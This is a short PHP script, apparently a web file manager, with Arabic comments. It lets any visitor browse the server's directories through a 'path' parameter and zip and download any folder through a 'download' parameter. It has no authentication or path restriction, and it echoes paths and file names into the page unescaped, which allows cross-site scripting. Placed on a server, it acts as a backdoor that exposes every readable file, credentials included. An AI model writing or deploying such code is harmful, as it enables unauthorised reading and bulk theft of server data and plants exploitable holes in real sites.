<?php
function zipFolder($source, $destination) {
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZipArchive::CREATE)) {
        return false;
    }

    $source = realpath($source);
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = realpath($file);
            if (is_dir($file)) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if (is_file($file)) {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    } else if (is_file($source)) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

// معالجة طلب تحميل المجلد
if (isset($_GET['download']) && file_exists($_GET['download']) && is_dir($_GET['download'])) {
    $folderPath = realpath($_GET['download']);
    $zipFilePath = $folderPath . '.zip';
    if (zipFolder($folderPath, $zipFilePath)) {
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . basename($zipFilePath) . '"');
        header('Content-Length: ' . filesize($zipFilePath));
        readfile($zipFilePath);
        unlink($zipFilePath); // حذف الملف بعد التحميل
        exit;
    }
}

$currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
$parentPath = dirname($currentPath);

echo "<a href='?path=$parentPath'>Back</a> | <a href='?'>Home</a><br>";
echo "الـ Path الحالي: " . $currentPath . "<br>";

$files = scandir($currentPath);
foreach ($files as $file) {
    $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
    if (is_dir($filePath)) {
        echo "<a href='?path=" . urlencode($filePath) . "'>$file</a> | ";
        echo "<a href='?download=" . urlencode($filePath) . "'>Download</a><br>";
    } else {
        echo "<a href='?path=" . urlencode($currentPath) . "&view=" . urlencode($file) . "'>$file</a><br>";
    }
}
?>
